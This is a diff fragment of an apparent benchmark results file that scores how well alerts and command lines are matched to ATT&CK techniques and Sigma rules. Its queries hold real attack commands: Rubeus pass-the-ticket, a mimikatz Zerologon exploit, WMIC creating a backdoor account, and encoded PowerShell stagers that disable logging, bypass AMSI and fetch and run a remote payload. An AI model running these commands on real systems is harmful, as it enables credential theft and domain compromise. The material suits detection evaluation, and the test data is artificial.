+      "query": "Image: C:\\Users\\sbeavers\\Desktop\\Rubeus.exe\nCommandLine: \"C:\\users\\sbeavers\\Desktop\\Rubeus.exe\" asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: \"C:\\windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAUwBpAG8ATgBUAGEAQgBsAEUALgBQAFMAVgBFAFIAUwBJAE8ATgAuAE0AYQBqAG8AUgAgAC0AZwBlACAAMwApAHsAJABDADYANwA9AFsAUgBlAEYAXQAuAEEAcwBTAEUAbQBiAGwAeQAuAEcARQB0AFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkAZQBgAEwARAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABDADYANwApAHsAJAA2AEMANAA9ACQAQwA2ADcALgBHAGUAdABWAGEATABVAEUAKAAkAE4AVQBsAEwAKQA7AEkAZgAoACQANgBjADQAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJAA2AGMANABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA2AEMANABbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAFYAYQBMAD0AWwBDAE8ATABMAGUAQwB0AGkATwBOAHMALgBHAEUAbgBlAHIASQBDAC4ARABJAEMAdABpAE8AbgBhAHIAWQBbAFMAdAByAEkATgBnACwAUwB5AHMAVABFAE0ALgBPAEIAagBFAGMAdABdAF0AOgA6AG4ARQB3ACgAKQA7ACQAVgBhAEwALgBBAEQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAA2AGMANABbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEATAB9AEUATABTAGUAewBbAFMAQwBSAEkAcABUAEIAbABPAGMASwBdAC4AIgBHAGUAdABGAEkARQBgAEwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBBAEwAdQBFACgAJABOAFUATABsACwAKABOAEUAVwAtAE8AYgBKAGUAQwBUACAAQwBPAGwAbABFAEMAdABJAE8AbgBTAC4ARwBlAE4AZQByAEkAYwAuAEgAYQBTAGgAUwBlAFQAWwBTAFQAcgBJAG4ARwBdACkAKQB9ACQAUgBFAEYAPQBbAFIAZQBmAF0ALgBBAHMAcwBlAE0AYgBMAFkALgBHAEUAVABUAFkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQAnACsAJwBVAHQAaQBsAHMAJwApADsAJABSAEUARgAuAEcARQBUAEYAaQBFAEwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAJwArACcAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBhAGwAdQBlACgAJABOAHUATABMACwAJAB0AHIAVQBFACkAOwB9ADsAWwBTAFkAcwBUAGUAbQAuAE4ARQB0AC4AUwBlAFIAdgBJAGMAZQBQAG8AaQBuAFQATQBhAG4AYQBHAEUAUgBdADoAOgBFAFgAUABFAGMAVAAxADAAMABDAG8ATgBUAEkATgB1AGUAPQAwADsAJABiAGEAMAA9AE4AZQBXAC0ATwBCAGoARQBjAFQAIABTAFkAcwBUAGUAbQAuAE4AZQBUAC4AVwBlAGIAQwBMAEkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAFQALgBFAG4AQwBPAEQAaQBuAEcAXQA6ADoAVQBOAGkAQwBPAGQAZQAuAEcAZQB0AFMAVABSAEkAbgBHACgAWwBDAG8ATgBWAGUAcgB0AF0AOgA6AEYAUgBvAE0AQgBhAHMAZQA2ADQAUwBUAHIAaQBuAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbABvAGcAaQBuAC8AcAByAG8AYwBlAHMAcwAuAHAAaABwACcAOwAkAGIAYQAwAC4ASABFAGEAZABFAFIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAYgBhADAALgBQAFIAbwB4AFkAPQBbAFMAeQBzAFQARQBNAC4ATgBFAHQALgBXAEUAYgBSAEUAcQB1AEUAcwB0AF0AOgA6AEQARQBmAGEAVQBMAHQAVwBFAEIAUAByAG8AeABZADsAJABiAGEAMAAuAFAAUgBPAHgAeQAuAEMAUgBlAGQAZQBOAFQASQBhAEwAUwAgAD0AIABbAFMAWQBzAFQAZQBtAC4ATgBFAHQALgBDAHIAZQBkAEUATgBUAGkAQQBMAEMAQQBDAGgARQBdADoAOgBEAEUARgBBAHUAbAB0AE4AZQBUAHcAbwByAEsAQwBSAEUARABFAE4AVABJAEEAbABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAGIAYQAwAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAFkAcwB0AEUAbQAuAFQARQBYAFQALgBFAE4AQwBPAEQAaQBOAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBFAHQAQgB5AFQAZQBTACgAJwAhADgAQABiAFAARABpADwARgBuADIASwBjAC8ASAAsAFQAKwBaAH0AbwByAEMAawBhAF0AJgAxAHUAUQBTAF8AJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAUgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AVQBOAHQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AQgB4AG8AUgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABiAEEAMAAuAEgAZQBBAEQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAWAByAGMAdABZAHQAdgBEAGMAagB2AGgAaAA9AGEAeABFAGQAUwA4AEcAOQByAGYAbwBEAHYAcABNADkAMgBMAHIAQwBqADYAbQBQAHcALwBnAD0AIgApADsAJABkAEEAVABhAD0AJABCAEEAMAAuAEQATwB3AE4ATABPAGEAZABEAEEAdABBACgAJABzAGUAcgArACQAVAApADsAJABpAFYAPQAkAEQAQQB0AGEAWwAwAC4ALgAzAF0AOwAkAGQAYQBUAEEAPQAkAEQAYQB0AGEAWwA0AC4ALgAkAEQAYQB0AGEALgBsAGUAbgBnAHQASABdADsALQBqAE8ASQBuAFsAQwBIAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAEQAQQBUAGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1550.003"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": 1,
+      "ndcg5": 0.6131471927654584,
+      "n_relevant": 2,
+      "top": [
+        "7ec2c172-dceb-4c10-92c9-87c1881b7e18",
+        "1816994b-42e1-4fb1-afd2-134d88184f71",
+        "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
+        "02030f2f-6199-49ec-b258-ea71b07e03dc",
+        "18988e1b-9087-4f8a-82fe-0414dce49878"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-145",
+      "query": "\"C:\\users\\sbeavers\\Desktop\\Rubeus.exe\" asktgt /user:pgustavo /rc4:81d310fa34e6a56a31145445891bb7b8 /ptt",
+      "kind": "technique",
+      "gold": [
+        "T1550.003"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1204.002",
+        "T1219",
+        "T1219.002",
+        "T1555.004",
+        "T1203"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-151",
+      "query": "C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe  \"lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\" exit C:\\Windows\\System32\\cmd.exe \"cmd.exe\" /c C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe \"lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\" exit",
+      "kind": "technique",
+      "gold": [
+        "T1210"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1218.014",
+        "T1218.011",
+        "T1218.003",
+        "T1218.004",
+        "T1204.002"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-151",
+      "query": "C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe  \"lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\" exit C:\\Windows\\System32\\cmd.exe \"cmd.exe\" /c C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe \"lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\" exit",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1210"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 3,
+      "top": [
+        "7cce6fc8-a07f-4d84-a53e-96e1879843c9",
+        "dee0a7a3-f200-4112-a99b-952196d81e42",
+        "c2b86e67-b880-4eec-b045-50bc98ef4844",
+        "502b42de-4306-40b4-9596-6f590c81f073",
+        "a642964e-bead-4bed-8910-1bb4d63e3b4d"
+      ]
+    },
+    {
+      "task": "fields->sigma",
+      "case_id": "day3-151",
+      "query": "Image: C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe\nCommandLine: C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe  \"lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\" exit\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: \"cmd.exe\" /c C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe \"lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\" exit",
+      "kind": "sigma_rule",
+      "gold": [
+        "T1210"
+      ],
+      "platform": "windows",
+      "logsource": "process_creation",
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 3,
+      "top": [
+        "dee0a7a3-f200-4112-a99b-952196d81e42",
+        "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
+        "7cce6fc8-a07f-4d84-a53e-96e1879843c9",
+        "502b42de-4306-40b4-9596-6f590c81f073",
+        "e593cf51-88db-4ee1-b920-37e89012a3c9"
+      ]
+    },
+    {
+      "task": "command->attack",
+      "case_id": "day3-151",
+      "query": "C:\\Users\\pgustavo\\Downloads\\mimikatz_trunk\\x64\\mimikatz.exe  \"lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit\" exit",
+      "kind": "technique",
+      "gold": [
+        "T1210"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": null,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1204.004",
+        "T1204.002",
+        "T1218.014",
+        "T1555.005",
+        "T1027.016"
+      ]
+    },
+    {
+      "task": "alert->attack",
+      "case_id": "day3-158",
+      "query": "C:\\Windows\\System32\\wbem\\WMIC.exe \"C:\\windows\\System32\\Wbem\\WMIC.exe\" /node:WORKSTATION6 process call create \"net user /add backdoor paw0rd1\" C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAUwBJAG8AbgBUAGEAYgBMAGUALgBQAFMAVgBFAHIAUwBJAE8ATgAuAE0AYQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJAAxADEAQgBEADgAPQBbAHIAZQBGAF0ALgBBAFMAcwBlAE0AYgBsAHkALgBHAGUAdABUAHkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAMQAxAEIAZAA4ACkAewAkAEEAMQA4AEUAMQA9ACQAMQAxAEIARAA4AC4ARwBlAHQAVgBhAEwAVQBFACgAJABuAFUAbABMACkAOwBJAGYAKAAkAEEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkAEEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABhADEAOABlADEAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AEEATAA9AFsAQwBvAEwAbABlAGMAdABpAE8ATgBTAC4ARwBlAE4ARQByAGkAQwAuAEQASQBjAFQAaQBPAG4AQQBSAFkAWwBTAHQAcgBJAE4ARwAsAFMAeQBzAFQARQBtAC4ATwBCAEoARQBjAHQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAQQBMAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAYQAxADgAZQAxAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMARQB7AFsAUwBjAFIAaQBwAFQAQgBsAE8AQwBLAF0ALgAiAEcAZQBUAEYASQBFAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbABVAGUAKAAkAE4AdQBMAEwALAAoAE4ARQB3AC0ATwBCAGoAZQBDAHQAIABDAG8ATABMAEUAYwBUAGkATwBOAFMALgBHAGUATgBlAHIASQBjAC4ASABBAHMASABTAGUAdABbAFMAVAByAGkAbgBnAF0AKQApAH0AJABSAGUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAEUATQBCAGwAeQAuAEcAZQBUAFQAeQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBFAHQARgBJAGUATABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATAB1AGUAKAAkAE4AVQBMAGwALAAkAHQAUgBVAGUAKQA7AH0AOwBbAFMAWQBTAHQARQBtAC4ATgBlAFQALgBTAGUAcgB2AEkAQwBlAFAAbwBJAE4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABwAGUAQwBUADEAMAAwAEMAbwBuAHQASQBOAHUAZQA9ADAAOwAkADcAYQA2AGUARAA9AE4AZQBXAC0ATwBCAEoAZQBDAFQAIABTAFkAcwB0AGUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAEkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAFQALgBFAE4AQwBvAGQAaQBOAEcAXQA6ADoAVQBuAGkAYwBvAGQARQAuAEcAZQB0AFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgBUAF0AOgA6AEYAcgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADcAQQA2AEUAZAAuAEgARQBBAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADcAYQA2AEUAZAAuAFAAUgBPAHgAWQA9AFsAUwB5AFMAVABFAG0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUAZQBzAFQAXQA6ADoARABlAGYAQQBVAEwAdABXAGUAQgBQAFIAbwBYAFkAOwAkADcAYQA2AEUARAAuAFAAUgBPAFgAWQAuAEMAUgBlAGQARQBuAHQASQBBAGwAUwAgAD0AIABbAFMAWQBzAFQARQBNAC4ATgBFAHQALgBDAFIAZQBkAEUAbgBUAEkAYQBMAEMAYQBjAGgARQBdADoAOgBEAEUARgBhAFUAbAB0AE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AdABJAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADcAYQA2AGUAZAAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAdABlAE0ALgBUAGUAWABUAC4ARQBuAEMAbwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQBUAGUAUwAoACcAcQBtAC4AQAApADUAeQA/AFgAeAB1AFMAQQAtAD0AVgBEADQANgA3ACoAfABPAEwAVwBCAH4AcgBuADgAXgBJACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANwBBADYAZQBkAC4ASABlAEEARABlAHIAcwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBLAHUAVQB6AHUAaQBkAD0AVgBtAGUASwBWADUAZABlAGsAZwA5AHkANwBrAC8AdABsAEYARgBBADgAYgAyAEEAYQBJAHMAPQAiACkAOwAkAEQAYQB0AGEAPQAkADcAYQA2AGUAZAAuAEQAbwB3AE4ATABvAGEAZABEAGEAdABBACgAJABTAEUAcgArACQAdAApADsAJABpAHYAPQAkAEQAQQBUAEEAWwAwAC4ALgAzAF0AOwAkAEQAYQBUAEEAPQAkAGQAQQBUAEEAWwA0AC4ALgAkAEQAYQBUAEEALgBMAEUAbgBHAHQASABdADsALQBKAE8AaQBOAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==",
+      "kind": "technique",
+      "gold": [
+        "T1047"
+      ],
+      "platform": "windows",
+      "logsource": null,
+      "first_rank": 9,
+      "ndcg5": 0.0,
+      "n_relevant": 1,
+      "top": [
+        "T1218.014",
+        "T1546.007",
+        "T1218.003",
+        "T1059.001",
+        "T1134.002"
+      ]
+    },
+    {
+      "task": "alert->sigma",
+      "case_id": "day3-158",
+      "query": "C:\\Windows\\System32\\wbem\\WMIC.exe \"C:\\windows\\System32\\Wbem\\WMIC.exe\" /node:WORKSTATION6 process call create \"net user /add backdoor paw0rd1\" C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAUwBJAG8AbgBUAGEAYgBMAGUALgBQAFMAVgBFAHIAUwBJAE8ATgAuAE0AYQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJAAxADEAQgBEADgAPQBbAHIAZQBGAF0ALgBBAFMAcwBlAE0AYgBsAHkALgBHAGUAdABUAHkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAMQAxAEIAZAA4ACkAewAkAEEAMQA4AEUAMQA9ACQAMQAxAEIARAA4AC4ARwBlAHQAVgBhAEwAVQBFACgAJABuAFUAbABMACkAOwBJAGYAKAAkAEEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkAEEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABhADEAOABlADEAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AEEATAA9AFsAQwBvAEwAbABlAGMAdABpAE8ATgBTAC4ARwBlAE4ARQByAGkAQwAuAEQASQBjAFQAaQBPAG4AQQBSAFkAWwBTAHQAcgBJAE4ARwAsAFMAeQBzAFQARQBtAC4ATwBCAEoARQBjAHQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAQQBMAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAYQAxADgAZQAxAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMARQB7AFsAUwBjAFIAaQBwAFQAQgBsAE8AQwBLAF0ALgAiAEcAZQBUAEYASQBFAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbABVAGUAKAAkAE4AdQBMAEwALAAoAE4ARQB3AC0ATwBCAGoAZQBDAHQAIABDAG8ATABMAEUAYwBUAGkATwBOAFMALgBHAGUATgBlAHIASQBjAC4ASABBAHMASABTAGUAdABbAFMAVAByAGkAbgBnAF0AKQApAH0AJABSAGUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAEUATQBCAGwAeQAuAEcAZQBUAFQAeQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBFAHQARgBJAGUATABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATAB1AGUAKAAkAE4AVQBMAGwALAAkAHQAUgBVAGUAK